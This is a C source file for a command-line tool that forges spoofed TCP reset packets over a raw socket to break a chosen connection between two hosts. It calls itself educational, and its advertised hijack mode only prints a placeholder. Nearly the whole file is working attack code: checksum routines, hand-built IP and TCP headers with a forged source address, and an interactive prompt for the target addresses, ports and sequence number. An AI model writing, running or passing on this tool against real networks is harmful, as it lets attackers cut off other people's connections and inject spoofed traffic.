// tcp_hijacker.c
// Educational TCP connection disruptor and hijacker
// For FreeBSD/Linux - use with root privileges only

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <errno.h>

struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;

    return answer;
}

void send_rst_packet(char *source_ip, char *dest_ip, int source_port, int dest_port, uint32_t seq) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    char datagram[4096];
    memset(datagram, 0, 4096);

    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct iphdr));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(dest_port);
    sin.sin_addr.s_addr = inet_addr(dest_ip);

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr(source_ip);
    iph->daddr = sin.sin_addr.s_addr;

    iph->check = csum((unsigned short *) datagram, iph->tot_len);

    tcph->source = htons(source_port);
    tcph->dest = htons(dest_port);
    tcph->seq = htonl(seq);
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->rst = 1;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    psh.source_address = inet_addr(source_ip);
    psh.dest_address = inet_addr(dest_ip);
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
    char *pseudogram = malloc(psize);

    memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));

    tcph->check = csum((unsigned short *) pseudogram, psize);

    int one = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        exit(1);
    }

    if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        perror("sendto");
    } else {
        printf("[+] RST packet sent to disrupt connection.\n");
    }

    free(pseudogram);
    close(s);
}

int main() {
    char source_ip[32], dest_ip[32];
    int source_port, dest_port;
    uint32_t seq;

    int mode;
    printf("\nTCP Hijacker (Educational)\n");
    printf("1. Disrupt connection\n2. Hijack connection (not yet implemented)\nChoose mode: ");
    scanf("%d", &mode);

    printf("Enter source IP: ");
    scanf("%s", source_ip);
    printf("Enter destination IP: ");
    scanf("%s", dest_ip);
    printf("Enter source port: ");
    scanf("%d", &source_port);
    printf("Enter destination port: ");
    scanf("%d", &dest_port);
    printf("Enter SEQ number to use: ");
    scanf("%u", &seq);

    if (mode == 1) {
        send_rst_packet(source_ip, dest_ip, source_port, dest_port, seq);
    } else if (mode == 2) {
        printf("Hijack mode coming soon...\n");
    } else {
        printf("Invalid mode.\n");
    }

    return 0;
}
